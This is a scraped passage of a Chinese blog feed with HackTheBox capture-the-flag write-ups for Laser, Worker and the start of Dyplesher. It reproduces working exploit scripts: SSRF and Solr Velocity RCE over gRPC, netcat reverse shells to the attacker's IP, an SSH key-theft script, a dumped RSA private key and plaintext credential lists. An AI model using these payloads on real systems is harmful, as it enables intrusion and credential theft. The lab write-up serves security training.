essionReq,3F,\"\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0@\\0\\0\\0\\x05\\0@\\0\\0\\0\\x06\\SF:0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\x01\\0\\0\\x08\\x06SF:\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\")%r(TerminalServerCookie,3F,\"\\0\\0\\x18\\x04\\0\\SF:0\\0\\0\\0\\0\\x04\\0@\\0\\0\\0\\x05\\0@\\0\\0\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0SF:\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\x01\\0\\0\\x08\\x06\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\")%r(SF:TLSSessionReq,3F,\"\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0@\\0\\0\\0\\x05\\0@\\0\\0\\0\\x0SF:6\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\x01\\0\\0\\x08\\xSF:06\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 39.25 seconds 有时候扫描结果会出现166,167，这是机器问题，非预期，user blood只有4分钟，就是通过非预期端口打的 91009100是HP jetdirect打印机，相关利用工具： https://github.com/RUB-NDS/PRET PRET简单的枚举，发现一个队列文件，下载下来, 这是一个加密文件，nvram dump可以得到 key 1234567891011121314151617181920212223242526272829303132$ python pret.py 10.10.10.201 pjl ________________ _/_______________/| /___________/___//|| PRET | Printer Exploitation Toolkit v0.40 |=== |----| || by Jens Mueller &lt;jens.a.mueller@rub.de&gt; | | ô| || |___________| ô| || | ||/.´---.|| | || 「 pentesting tool that made |-||/_____\\||-. | |´ dumpster diving obsolete‥ 」 |_||=L==H==||_|__|/ (ASCII art by Jan Foerster)Connection to 10.10.10.201 establishedDevice: LaserCorp LaserJet 4MLWelcome to the pret shell. Type help or ? to list commands.10.10.10.201:/&gt; lsd - pjl10.10.10.201:/&gt; cd pjl10.10.10.201:/pjl&gt; lsd - jobs10.10.10.201:/pjl&gt; cd jobs10.10.10.201:/pjl/jobs&gt; ls- 172199 queued10.10.10.201:/pjl/jobs&gt; get queued172199 bytes received.10.10.10.201:/pjl/jobs&gt; nvram dumpWriting copy to nvramk...e....y.....13vu94r6..643rv19u10.10.10.201:/pjl/jobs&gt; key :13vu94r6643rv19u convert file首先处理文件，去除多余字符 1sed -e \"s#'##g\" queued | cut -c2- &gt; queued.b64 decode filequeued文件是base64编码过的，首先解码： 1234567import base64with open(\"queued.b64\",\"r\") as mmm: mmm_content = mmm.read() b64dec_content = base64.b64decode(mmm_content) with open(\"secwalk.raw\",\"wb\") as mmm_jpg: mmm_jpg.write(b64dec_content) decrypt然后AES解密，得到的是一个pdf文件： 123456789import io, sys, base64from Crypto.Cipher import AESwith io.open('secwalk.raw', 'rb') as fp: c = fp.read()[8:] iv, ct = c[:16], c[16:] cipher = AES.new('13vu94r6643rv19u', AES.MODE_CBC, iv) z = cipher.decrypt(ct) sys.stdout.buffer.write(z) 1python3 decrypt.py &gt; secwalk.pdf 信息pdf里部分有用信息： 12345678...return service_pb2.Data(feed&#x3D;&#39;Pushing feeds&#39;) ...&#123;&quot;version&quot;: &quot;v1.0&quot;,&quot;title&quot;: &quot;Printer Feed&quot;,&quot;home_page_url&quot;: &quot;http:&#x2F;&#x2F;printer.laserinternal.htb&#x2F;&quot;, &quot;feed_url&quot;: &quot;http:&#x2F;&#x2F;printer.laserinternal.htb&#x2F;feeds.json&quot;, &quot;items&quot;: [] &#125; 现在我们知道9000端口运行着GRPC服务 9000 GRPC加host后，9000端口能直接访问： 根据grpc文档和pdf内容，我们可以猜到后端是python grpc实现： Introduction to gRPC – gRPChttps://grpc.io/docs/what-is-grpc/introduction/ Basics Tutorial – gRPChttps://grpc.io/docs/languages/python/basics/ 根据PDF文件名，我们定义了一个Print服务,该服务具有叫做Feed的RPC方法，此方法将Content作为输入参数，并从服务器返回Data. 也就是说，我们可以通过RPC与服务器交互获取数据 Protocol Buffers首先自己创建一个proto文件： 12345678910111213syntax = \"proto3\";message Content &#123; string data = 1;&#125;message Data &#123; float feed = 1;&#125;service Print &#123; rpc Feed(Content) returns (Data) &#123;&#125;&#125; 然后使用Python生成grpc class： 123pip3 install grpciopip3 install grpcio-toolspython3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. miao.proto 自动生成了两个文件，miao_pb2.py和miao_pb2_grpc.py client然后我们可以使用已有文件构造grpc client,feed url使用我们的server，可以接收到请求： client.py12345678910111213import sys, pickle, base64import grpc, miao_pb2, miao_pb2_grpcpayload = '&#123;\"feed_url\":\"http://10.10.14.4:4444\"&#125;'payload = base64.b64encode(pickle.dumps(payload))channel = grpc.insecure_channel('10.10.10.201:9000')stub = miao_pb2_grpc.PrintStub(channel)content = miao_pb2.Content(data=payload)try: response = stub.Feed(content, timeout=10) print(response)except Exception as ex: print(ex) 本地端口扫描但无法直接执行任何命令，那么可以考虑探测本地其他服务，首先扫描端口,(这一步会花费一点时间)： 发现两个新端口，7983和8983，8983是solr默认端口 scanner.py12345678910111213141516import sys, pickle, base64import grpc, miao_pb2, miao_pb2_grpcfor port in range(1, 65536): payload = '&#123;\"feed_url\":\"http://localhost:' + str(port) + '\"&#125;' payload = base64.b64encode(pickle.dumps(payload)) channel = grpc.insecure_channel('10.10.10.201:9000') stub = miao_pb2_grpc.PrintStub(channel) content = miao_pb2.Content(data=payload) try: response = stub.Feed(content, timeout=10) print(port, response) except Exception as ex: if 'Connection refused' in ex.details(): continue print(port) Apache solr搜索发现solr相关漏洞： Apache Solr 8.2.0 - Remote Code Execution - Java webapps Exploithttps://www.exploit-db.com/exploits/47572 veracode-research/solr-injection: Apache Solr Injection Researchhttps://github.com/veracode-research/solr-injection#7-cve-2019-17558-rce-via-velocity-template-by-_s00py 但漏洞需要直接去访问端口，现在我们是用过GRPC，搜索能够得到： https://github.com/fullstorydev/grpcurl 之后就是构造请求数据，exp一把梭，打之前先用client确认一下service状态： service check有响应才代表服务正常，机器问题很可能没响应导致后面没法做： 12$ python3 client.pyfeed: \"Pushing feeds\" 12345678910111213import sys, pickle, base64import grpc, miao_pb2, miao_pb2_grpcpayload = '&#123;\"feed_url\":\"http://localhost:8983\"&#125;'payload = base64.b64encode(pickle.dumps(payload))channel = grpc.insecure_channel('10.10.10.201:9000')stub = miao_pb2_grpc.PrintStub(channel)content = miao_pb2.Content(data=payload)try: response = stub.Feed(content, timeout=10) print(response)except Exception as ex: print(ex) reverse shell &amp; user flag然后就是两步exp打到reverse shel,在用户目录得到user.txtl： exp.py123456789import base64import pickleimport osdata0 = '&#123;\"feed_url\":\"gopher://localhost:8983/0POST%20%2Fsolr%2Fstaging%2Fconfig%20HTTP%2F1.1%0AHost%3A%20localhost%3A8983%0AContent-Type%3A%20application%2Fjson%0AContent-Length%3A%20259%0A%0A%7B%0A%20%20%22update-queryresponsewriter%22%3A%20%7B%0A%20%20%20%20%22startup%22%3A%20%22lazy%22%2C%0A%20%20%20%20%22name%22%3A%20%22velocity%22%2C%0A%20%20%20%20%22class%22%3A%20%22solr.VelocityResponseWriter%22%2C%0A%20%20%20%20%22template.base.dir%22%3A%20%22%22%2C%0A%20%20%20%20%22solr.resource.loader.enabled%22%3A%20%22true%22%2C%0A%20%20%20%20%22params.resource.loader.enabled%22%3A%20%22true%22%0A%20%20%7D%0A%7D\"&#125;'data = base64.b64encode(pickle.dumps(data0))# print dataos.system(\"grpcurl -v -plaintext -d '&#123;\\\"data\\\":\\\"%s\\\"&#125;' -proto miao.proto 10.10.10.201:9000 Print.Feed\" %data.decode()) exp2.py服务器上nc没有-e选项的，注意自己改下payload: 1rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.14.52 4444 &gt;&#x2F;tmp&#x2F;f 12345678910import base64import pickleimport osimport sysdata1 = '&#123;\"feed_url\":\"http://localhost:8983/solr/staging/select?q=1&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27nc%2010.10.14.52%204444%20-e%20%2Fbin%2Fbash%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\"&#125;'data = base64.b64encode(pickle.dumps(data1))# print dataos.system(\"grpcurl -v -plaintext -d '&#123;\\\"data\\\":\\\"%s\\\"&#125;' -proto miao.proto 10.10.10.201:9000 Print.Feed\" %data.decode()) 提权信息pspy64传个pspy上去，搜集信息： 123wget http://10.10.14.52:9999/pspy64chmod +x pspy64./pspy64 docker passwd注意到有一个定时连接到docker，使用了sshpass指定密码，密码被隐藏了，但运行一段时间后会得到明文密码(跑着pspy耐心等吧)： ssh - Why does sshpass still prompt for a password? - Server Faulthttps://serverfault.com/questions/934836/why-does-sshpass-still-prompt-for-a-password 12342020&#x2F;09&#x2F;08 01:41:01 CMD: UID&#x3D;0 PID&#x3D;889907 | scp &#x2F;root&#x2F;clear.sh root@172.18.0.2:&#x2F;tmp&#x2F;clear.sh2020&#x2F;09&#x2F;08 01:29:01 CMD: UID&#x3D;0 PID&#x3D;875583 | sshpass -p c413d115b3d87664499624e7826d8c5a ssh root@172.18.0.2 &#x2F;tmp&#x2F;clear.sh2020&#x2F;09&#x2F;08 01:41:01 CMD: UID&#x3D;0 PID&#x3D;889927 | ssh root@172.18.0.2 &#x2F;tmp&#x2F;clear.sh2020&#x2F;09&#x2F;08 01:41:01 CMD: UID&#x3D;0 PID&#x3D;889946 | ssh root@172.18.0.2 rm &#x2F;tmp&#x2F;clear.sh 可以登录进docker容器： 利用方式根据pspy信息我们知道是宿主机root权限ssh连接到docker后执行/tmp/clear.sh，那么我们如果在docker内将ssh端口转发到宿主机，宿主机会root权限ssh连接到自身，去尝试执行/tmp/clear.sh,而我们可以控制宿主机的/tmp/clear.sh /tmp/clear.sh 就是把root用户的ssh私钥复制出来更改权限： 12echo '#!/bin/sh\\nmkdir -p /tmp/secwalk;cp -R /root/.ssh /tmp/secwalk; chown -R solr:solr /tmp/secwalk' &gt; /tmp/clear.shchmod a+x /tmp/clear.sh docker 端口转发1234wget http://10.10.14.52:9999/socatservice ssh stopchmod +x socat./socat TCP-LISTEN:22,fork,reuseaddr TCP:172.18.0.1:22 root ssh_key等待触发，然后我们拿到root用户的ssh key： 123456789101112131415161718192021222324252627282930313233343536373839-----BEGIN RSA PRIVATE KEY-----MIIG5AIBAAKCAYEAsCjrnKOm6iJddcSIyFamlV1qx6yT9X+X&#x2F;HXW7PlCGMif79mdzutss91E+K5D&#x2F;xLe&#x2F;YpUHCcTUhfPGjBjdPmptCPaiHd30XN5FmBxmN++MAO68HjsoIEgi+2tScVpokjgkF411nIS+4umg6Q+ALO3IKGortuRkOtZNdPFSv0+1Am6PdvFibyGDi8ieYIK4dIZF9slEoqPlnV9lz0YWwRmSobZYQ7xX1wtmnaIrIxgHmpBYGBWQQ7718Kh6RNnvCh3UPEjx9GIh+2y5Jj7uxGLLDAQ3YbMKxm2ykChfI7L95kzuxQemwQvIVe+R+ORLQJmBanA7AiyEyHBUYN27CF2B9wLgTj0LzHowc1xEcttbalNyL6xRgmXO10WJjSH1gn47VIb4X+5chbmExavRiUnfgh&#x2F;JGZ1hpBdiVwykQtvpf7f1jaMvy3ouV&#x2F;nVq7gdT2iz+jeQ8jZUVjNfaFKEN6nsQQ1YmPH6BUJcL7NJQGcohqn7L0Pp6SJGiUgb9K57llzAgMBAAECggGAdxpTosZrFiZB9lv49yrO2nIcvgAK0ZOBGSo7NGGatNMAf9QshDhceIeEGHcKdi02I0ohcB9jSr&#x2F;aQKSyueYLPUZ4fIf5tN1T4zM12tx75E7BV9EKe8KSVMlPvm8A6r5HRpTL5b+e4gAbhynG2gaoLCHgwMindMoKuQADhp4OmqIxD53Fw0h5gqGPt4ObA+9fE+gQ+qZASsQJM&#x2F;YUv4UL&#x2F;BuMYbkOrSDPnH3EDpWiby38IcNAzh&#x2F;pWom3mrSKEIdydJ96RxaY&#x2F;3zxiCbQ974cdR1eI7V+2u&#x2F;ABvnIwn15cX3WDi62xoWi&#x2F;XzxsmvZxU&#x2F;PXPJoptFEVjJ5Apgjl0Fb6xveVpmGtmM2J8TlBROyATejhhiFelUF16vgik+UUm3oXJtpix8HVqWg4zoYXAOTnwlJiHstavLy+zRTu&#x2F;3kHkNi4UgW1iYXU93gUiym2iDnMvaSc01yQPXDm8kuoHU8C&#x2F;+10ryx3ZvEuDbz9FmD9cB8B6rpqmoXIbItSehpushRAoHBAOP2Eg3undNkFk+fio2k3WqRz8+1gN1WunuL90O1noA&#x2F;CUc9t3rpcmAEwMIWGxc1btK1HkWKjUk2RNu0TPdlSiFoFTYSwBw9c5nGFqHV8JeSxpm7Yco9CqpLbKeg+FuchY4oym+dM6pL&#x2F;JtyhdGe3yrzo7UZoiXWPypKJK2URli3ZOQRpbWZivpk9r+Q09K3VbXDEo7EunKXWtS2cA2aqp2yx2oORyl&#x2F;SmGh028aUqYrGhWmHlFTXor9pibIwdEv1QKBwQDF08EL0UiQzGS1GFtP7tUj3AISwO3YRHQJImpYPecLdMqC+FWOA0Wj5ONL7Sq9ehzaLiKXXicmKIwQlMmFmBEoyovqezSkBx2iK4nwnoTQw2LJfagjyylXHGgvTBPuv&#x2F;uuuujhiX0veDo4UH6yCCyCGtnUeJ6bCvIpRk&#x2F;XpZySvSkt3bkpsmx0qdKsmp4MqITvuxDmHRreqcHHecW&#x2F;WKtFVE7KzfLBZRkbXQMS+FqXw2diae8rMgRHY&#x2F;BmSUfn0CcCgcEA10BUfflR5&#x2F;i7JIY2c1c4h9eVTcFKJDYvsldQrQvC1cAwB6gcJ6BlkosKZHoxLHIU6juBkRKqJHZtALQ4dOac3&#x2F;yDAuMjqcbQ8GPenQQBwW4jv6fzR97pwjGkMIjL2t1qMvkLZecfkO9dYH78IxqMCeezLl88&#x2F;9NVI56NEaZP4peRWdXcDiUk2Rka8XpUucTJ1u6TCGJ0151ZdD+sgPwJnQziRZ+jzGhYmOYQWvmVDzjl0YlhWVOKk129VSP994PdAoHANFXzCmdRpU0Nj4NkFN+Ab74ypjd4NPDXKdt6+uFVkIhTUxbTu4BOGi&#x2F;hmiKiXgJCQ85UxGraPJQZigFy1u8GCx6aqWvy3zoqss6F7axiQsCOD&#x2F;Q4WU&#x2F;UHgGb5ndgBpevw+ga2CABiF9sN53EBuF2tOzZmAZZH3dj3VuGn+xmYcO9cy7nX4qeera6z4MQMRUcJjf9HoOwqhuK8nTaxeZ1WSAWwDx&#x2F;7n4KiFyxBYHCpcfCQBz6cxkGXMSpwsW8Si2dAoHBAOEfVHHzY1NN9zmBThmj4+LRziBTcVxT&#x2F;KWtSaSbpmLE3gLqTqvRXSlNNM9ZFb2+TpPe1tGsINO3nVIoF&#x2F;A97pHpw2YRtbHFscJbhUCkP65ZOcQg+hQcBGvi9VEmfve&#x2F;OPHMiSvTSBNSbgJuljQ7Wp+CYpVpDpxoHgHOZCCdD+WRRlacU&#x2F;GKkex1gYuoL7iHFVQuBMD6jyjo1DfJUHHfYdOqwfQX2ZgUX0VPD2RvtP3Z0ta&#x2F;VJJiWtE8o8RwHgjiGw&#x3D;&#x3D;-----END RSA PRIVATE KEY----- root flag 之后使用这个key登录，得到root.txt: 参考资料 https://github.com/RUB-NDS/PRET Introduction to gRPC – gRPChttps://grpc.io/docs/what-is-grpc/introduction/ Basics Tutorial – gRPChttps://grpc.io/docs/languages/python/basics/ Apache Solr 8.2.0 - Remote Code Execution - Java webapps Exploithttps://www.exploit-db.com/exploits/47572 veracode-research/solr-injection: Apache Solr Injection Researchhttps://github.com/veracode-research/solr-injection#7-cve-2019-17558-rce-via-velocity-template-by-_s00py https://github.com/fullstorydev/grpcurl Solr Velocity模板注入漏洞分析 | Anemone’s Bloghttps://anemone.top/vulnresearch-Solr_Velocity_injection/ ssh - Why does sshpass still prompt for a password? - Server Faulthttps://serverfault.com/questions/934836/why-does-sshpass-still-prompt-for-a-password HACK THE BOX - Laser 10.10.10.201 [SSH KEY FOR EASY USER AND ROOT FLAG]https://hacktheboxwriteups.blogspot.com/2020/08/lasersshkey.html HackTheBox Laser Writeup-10.10.10.201-nav1n.comhttps://www.nav1n.com/2020/08/hackthebox-laser-writeup-10-10-10-201-laser/ Hack-The-Box-walkthrough[laser] | lUc1f3r11’s bloghttps://fdlucifer.github.io/2020/08/19/laser/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Worker - HackTheBox","slug":"Worker-HackTheBox","date":"2020-09-04T06:56:43.000Z","updated":"2021-02-01T00:33:39.275Z","comments":true,"path":"2020/09/04/Worker-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/09/04/Worker-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/270 10.10.10.203 端口扫描1234567891011121314151617$ nmap -sC -sV 10.10.10.203Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-04 12:00 CSTNmap scan report for 10.10.10.203Host is up (0.068s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server3690/tcp open svnserve SubversionService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 29.77 seconds 8080是IIS默认页面： 36903690是SVN： SVNlist123$ svn list svn://10.10.10.203dimension.worker.htb/moved.txt moved.txtmoved.txt里得到一个新域名，加到host后访问： 123456789$ svn export svn://10.10.10.203/moved.txtA moved.txtExport complete.$ cat moved.txtThis repository has been migrated and will no longer be maintaned here.You can find the latest version at: http://devops.worker.htb// The Worker team :) ##devops.worker.htb 110.10.10.203 devops.worker.htb worker.htb 需要登录，首先需要从其他地方得到登录信息： dimension.worker.htb这个目录下载下来没什么有用信息(兔子洞)： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768$ svn export svn://worker.htb/dimension.worker.htb/A dimension.worker.htbA dimension.worker.htb/LICENSE.txtA dimension.worker.htb/README.txtA dimension.worker.htb/assetsA dimension.worker.htb/assets/cssA dimension.worker.htb/assets/css/fontawesome-all.min.cssA dimension.worker.htb/assets/css/main.cssA dimension.worker.htb/assets/css/noscript.cssA dimension.worker.htb/assets/jsA dimension.worker.htb/assets/js/breakpoints.min.jsA dimension.worker.htb/assets/js/browser.min.jsA dimension.worker.htb/assets/js/jquery.min.jsA dimension.worker.htb/assets/js/main.jsA dimension.worker.htb/assets/js/util.jsA dimension.worker.htb/assets/sassA dimension.worker.htb/assets/sass/baseA dimension.worker.htb/assets/sass/base/_page.scssA dimension.worker.htb/assets/sass/base/_reset.scssA dimension.worker.htb/assets/sass/base/_typography.scssA dimension.worker.htb/assets/sass/componentsA dimension.worker.htb/assets/sass/components/_actions.scssA dimension.worker.htb/assets/sass/components/_box.scssA dimension.worker.htb/assets/sass/components/_button.scssA dimension.worker.htb/assets/sass/components/_form.scssA dimension.worker.htb/assets/sass/components/_icon.scssA dimension.worker.htb/assets/sass/components/_icons.scssA dimension.worker.htb/assets/sass/components/_image.scssA dimension.worker.htb/assets/sass/components/_list.scssA dimension.worker.htb/assets/sass/components/_table.scssA dimension.worker.htb/assets/sass/layoutA dimension.worker.htb/assets/sass/layout/_bg.scssA dimension.worker.htb/assets/sass/layout/_footer.scssA dimension.worker.htb/assets/sass/layout/_header.scssA dimension.worker.htb/assets/sass/layout/_main.scssA dimension.worker.htb/assets/sass/layout/_wrapper.scssA dimension.worker.htb/assets/sass/libsA dimension.worker.htb/assets/sass/libs/_breakpoints.scssA dimension.worker.htb/assets/sass/libs/_functions.scssA dimension.worker.htb/assets/sass/libs/_mixins.scssA dimension.worker.htb/assets/sass/libs/_vars.scssA dimension.worker.htb/assets/sass/libs/_vendor.scssA dimension.worker.htb/assets/sass/main.scssA dimension.worker.htb/assets/sass/noscript.scssA dimension.worker.htb/assets/webfontsA dimension.worker.htb/assets/webfonts/fa-brands-400.eotA dimension.worker.htb/assets/webfonts/fa-brands-400.svgA dimension.worker.htb/assets/webfonts/fa-brands-400.ttfA dimension.worker.htb/assets/webfonts/fa-brands-400.woffA dimension.worker.htb/assets/webfonts/fa-brands-400.woff2A dimension.worker.htb/assets/webfonts/fa-regular-400.eotA dimension.worker.htb/assets/webfonts/fa-regular-400.svgA dimension.worker.htb/assets/webfonts/fa-regular-400.ttfA dimension.worker.htb/assets/webfonts/fa-regular-400.woffA dimension.worker.htb/assets/webfonts/fa-regular-400.woff2A dimension.worker.htb/assets/webfonts/fa-solid-900.eotA dimension.worker.htb/assets/webfonts/fa-solid-900.svgA dimension.worker.htb/assets/webfonts/fa-solid-900.ttfA dimension.worker.htb/assets/webfonts/fa-solid-900.woffA dimension.worker.htb/assets/webfonts/fa-solid-900.woff2A dimension.worker.htb/imagesA dimension.worker.htb/images/bg.jpgA dimension.worker.htb/images/overlay.pngA dimension.worker.htb/images/pic01.jpgA dimension.worker.htb/images/pic02.jpgA dimension.worker.htb/images/pic03.jpgA dimension.worker.htb/index.htmlExported revision 5. 域名加hosts后访问： checkout当前svn是在revision 5，可以查看下历史版本，在2发现了一个deploy.ps1文件, 里面得到一组账号密码： 1234567891011$ svn checkout -r 2 svn://worker.htbA deploy.ps1Checked out revision 2.$ cat deploy.ps1$user = \"nathen\"$plain = \"wendel98\"$pwd = ($plain | ConvertTo-SecureString)$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd$args = \"Copy-Site.ps1\"Start-Process powershell.exe -Credential $Credential -ArgumentList (\"-file $args\") devops然后使用这个账号密码可以登录前面的devops.worker.htb(不知道哪里的问题，火狐登录一直失败，换safari就可以)： SmartHotel360 &gt; Repos &gt; Branches 新建一个分支： upload shell然后去自己新建的分支上传文件，上传aspx webshell： pull request然后去新建一个pull request把我们的变更合并到master(需要指定工作项，要不然后面没法完成，随意选个1就行)： Approve &gt; Complete &gt; Complete Merge然后去批准，完成合并： webshell得到webshell： http://spectral.worker.htb/aspxshell.aspx reverse shell然后转成reverse shel, 这里方便操作直接用meterpreter了l： 信息搜集在w:\\svnrepos\\www\\conf目录下有一个passwd文件，里面很多用户名密码： 然后其中有用的是： 1robisl : wolves11 passwd1234567891011121314151617181920212223242526272829303132333435363738394041[users]nathen &#x3D; wendel98nichin &#x3D; fqerfqerfnichin &#x3D; asifhiefhnoahip &#x3D; playernuahip &#x3D; wkjdnwoakhol &#x3D; bxwdjhcueowehol &#x3D; supersecretpaihol &#x3D; painfulcodeparhol &#x3D; gitcommitpathop &#x3D; iliketomoveitpauhor &#x3D; nowayjosepayhos &#x3D; icanjiveperhou &#x3D; elvisisalivepeyhou &#x3D; ineedvacationphihou &#x3D; pokemonquehub &#x3D; pickmequihud &#x3D; kindasecurerachul &#x3D; guesswhoraehun &#x3D; idontknowramhun &#x3D; thisisranhut &#x3D; gettingrebhyd &#x3D; rediculousreeinc &#x3D; iagreereeing &#x3D; tosomepointreiing &#x3D; isthisenoughrenipr &#x3D; dummyrhiire &#x3D; usersriairv &#x3D; canyouricisa &#x3D; seewhichrobish &#x3D; onesarerobisl &#x3D; wolves11robive &#x3D; andwhichronkay &#x3D; onesarerubkei &#x3D; therupkel &#x3D; sheepsryakel &#x3D; imtiredsabken &#x3D; drjonessamken &#x3D; aquasapket &#x3D; hamburgersarkil &#x3D; friday user flag然后使用上面有效的那个用户密码登录，桌面得到user.txt: 提权信息robisl用户在Authenticated Users用户组中，这意味着他也可以使用Azure Devops： 12345678910111213141516171819202122232425262728293031323334*Evil-WinRM* PS C:\\Users\\robisl\\Desktop&gt; whoami /allUSER INFORMATION----------------User Name SID============= ==============================================worker\\robisl S-1-5-21-3082756831-2119193761-3468718151-1330GROUP INFORMATION-----------------Group Name Type SID Attributes====================================== ================ ============================================== ==================================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupWORKER\\Production Alias S-1-5-21-3082756831-2119193761-3468718151-1018 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\Medium Mandatory Level Label S-1-16-8192PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled 提权使用robisl:wolves11登录devops.worker.htb PartsUnlimited -&gt; PipelinesNew Pipeline &gt; Azure Repos Git &gt; PartsUnlimited &gt; Starter Pipeline 新建一个pipeline脚本，内容直接改成读取root.txt: 保存并运行，选项改成新分支，pull request： 注意上图代码可能会报错没有default pool，可以直接把其他的都删了，只保留step那两行 root flag保存运行，然后在一堆success里有一个Run a one-line script，里面是执行结果： 参考资料 HackTheBox - Worker 10.10.10.203 - WriteUp - BinaryBicepshttps://binarybiceps.com/hackthebox-worker-writeup/ HACK THE BOX - Worker 10.10.10.203 [Writeup/Walkthrough]https://hacktheboxwriteups.blogspot.com/2020/08/nmap-scan-nmap-10.html Worker HTB Hack The Box - YouTubehttps://www.youtube.com/watch?v=oy2-39qPEKI HackTheBox - WORKER Walkthrough - YouTubehttps://www.youtube.com/watch?v=15v7V9_7HfI","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Dyplesher - HackTheBox","slug":"Dyplesher-HackTheBox","date":"2020-09-03T08:04:10.000Z","updated":"2020-10-26T00:41:57.158Z","comments":true,"path":"2020/09/03/Dyplesher-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/09/03/Dyplesher-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/253 10.10.10.190 端口扫描需要全端口扫描，一些非常见端口： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174$ nmap -p- 10.10.10.190Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 10:47 CSTNmap scan report for 10.10.10.190Host is up (0.074s latency).Not shown: 65525 filtered portsPORT STATE SERVICE22/tcp open ssh80/tcp open http3000/tcp open ppp4369/tcp open epmd5672/tcp open amqp11211/tcp open memcache25562/tcp open unknown25565/tcp open minecraft25572/tcp closed unknown25672/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 123.48 seconds$ nmap -p 22,80,3000,4369,5672,11211,25562,25565,25672 -sC -sV 10.10.10.190Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 10:51 CSTNmap scan report for 10.10.10.190Host is up (0.070s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 7e:ca:81:78:ec:27:8f:50:60:db:79:cf:97:f7:05:c0 (RSA)| 256 e0:d7:c7:9f:f2:7f:64:0d:40:29:18:e1:a1:a0:37:5e (ECDSA)|_ 256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Dyplesher3000/tcp open ppp?| fingerprint-strings:| GenericLines, Help:| HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest:| HTTP/1.0 200 OK| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gogs=aa0f12ef62403659; Path=/; HttpOnly| Set-Cookie: _csrf=n-2YIlY7SbOlxR8DIWAGFqksLx46MTU5OTEwMTUzMjU4MTk0NDM3OQ%3D%3D; Path=/; Expires=Fri, 04 Sep 2020 02:52:12 GMT; HttpOnly| Date: Thu, 03 Sep 2020 02:52:12 GMT| &lt;!DOCTYPE html&gt;| &lt;html&gt;| &lt;head data-suburl=\"\"&gt;| &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt;| &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"/&gt;| &lt;meta name=\"author\" 